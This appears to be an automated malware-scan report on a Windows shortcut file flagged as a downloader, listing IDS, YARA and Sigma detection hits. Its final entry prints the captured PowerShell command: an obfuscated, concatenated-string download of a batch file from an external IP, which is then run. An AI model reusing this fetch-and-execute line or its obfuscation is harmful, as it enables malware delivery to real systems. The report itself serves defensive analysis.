crowdsourced_ids_results.rule_msg: ET MALWARE Possibly Malicious Base64 Unicode WebClient DownloadString M1

crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )

crowdsourced_ids_results.rule_msg: ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1"; flow:established,to_client; file.data; content:!"|22|manifestVersion|22|"; content:!"<html"; content:!"|22 7d 2c|"; content:"powershell"; fast_pattern; nocase; content:"-w"; nocase; distance:0; content:"hidden"; within:17; classtype:bad-unknown; sid:2026989; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, created_at 2019_02_28, deployment alert_only, performance_impact Low, confidence Low, signature_severity Minor, tag PowerShell, updated_at 2023_04_25, reviewed_at 2023_10_11;)

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Detects LNK file with suspicious content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

attributes.magic: MS Windows shortcut, Item id list present, Has Relative path, Has command line arguments, Icon number=3, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

exiftool.Flags: IDList, RelativePath, CommandArgs, IconFile, Unicode, ExpIcon

sigma_analysis_results.rule_description:
Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.
In it's default mode, it builds a self deleting .bat file which executes malicious command.
The detection rule relies on creation of the malicious bat file (debug.bat by default).

match_context.values: @{Image=C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Public\it.bat; EventID=11}

sigma_analysis_results.rule_description:
Adversaries may abuse the Windows command shell for execution.
The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.
The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.
Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.
Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system

match_context.values: @{ScriptBlockText=(New-Object Net.WebClient).DownloadFile('http://7'+'7.2'+'39.12'+'5.4'+'1:84'+'43/it.ba'+'t','C:\Users\Public\it.b'+'at'); Start-Process 'C:\Users\Public\it.bat'; MessageTotal=1; ScriptBlockId=fd610097-0898-430b-a123-b3145a96984d; Path=; EventID=4104; MessageNumber=1}
